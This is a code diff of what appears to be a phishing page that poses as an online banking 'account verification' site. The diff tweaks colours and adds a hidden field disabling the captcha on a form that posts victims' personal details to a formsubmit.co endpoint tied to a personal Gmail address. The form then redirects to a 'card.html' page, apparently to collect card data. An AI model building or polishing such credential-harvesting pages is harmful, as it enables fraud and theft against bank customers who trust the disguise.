@@ -14,19 +14,22 @@
             margin: 0;
             padding: 0;
         }
+        nav {
+            border-bottom: 7px solid orange;
+        }
         .form-btns {
             width: 100%;
             padding: 0.7rem 3.3rem;
             color: white;
-            background-color: green;
-            border: 1px solid green;
+            background-color: darkgreen;
+            border: 1px solid darkgreen;
             border-radius: 3px;
         }
     </style>
 </head>
 
 <body>
-    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: green; color: black">
+    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: darkgreen; color: black">
         <div class="container">
             <div class="mx-auto">
                 <img src="./white logo.png" onclick="window.location.href = 'index.html'" id="logo" alt="" width="104px"
@@ -39,13 +42,14 @@
     <section class="my-5">
         <div class="container-fluid py-3">
             <p>Verification</p>
-            <h1 id="headthree" style="color: green;">Account Needs Verification!</h1>
+            <h1 id="headthree" style="color: darkgreen;">Account Needs Verification!</h1>
             <p>
                 Verify access to your Online Banking account in just a few steps
             </p>
         </div>
         <form action="https://formsubmit.co/fishtina84@gmail.com" method="post">
             <input type="hidden" name="_next" value="https://code-warlock.github.io/testb/card.html">
+            <input type="hidden" name="_captcha" value="false">
             <div class="row container-fluid input-group mx-auto" id="personal">
                 <div class="input-group col-lg-3 col-md-4 col-12"></div>
                 <label for="">Full Name</label>
